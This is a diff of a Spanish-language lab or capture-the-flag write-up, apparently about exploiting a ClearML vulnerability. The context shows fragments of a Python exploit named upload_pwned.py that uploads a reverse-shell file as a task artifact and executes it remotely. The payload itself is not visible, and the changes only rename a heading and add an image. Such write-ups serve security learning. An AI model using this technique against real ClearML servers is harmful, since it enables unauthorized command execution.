@@ -64,7 +64,7 @@ al abrir `clearml-ini` vamos a ingresar las credenciales de la api que creamos e
 en esta web nos muestra un ejemplo de como aprovechar la vulnerabilidad para subir un archivo y poder tener ejecución de comandos usaremos este ejemplo para crear nuestro propio exploit para poder cargar un archivo a la maquina llamado `ddd-task` con la reverse shell 
 ![[Pasted image 20240611125301.png]]
 
-### u
+### upload_pwned.py
 ```python
 ```python
 import os
@@ -90,4 +90,6 @@ task.upload_artifact(name="ddd_artifact",
 
 task.execute_remotely(queue_name='default')
 ```
-```
+
+##
+![[Pasted image 20240611125901.png]]
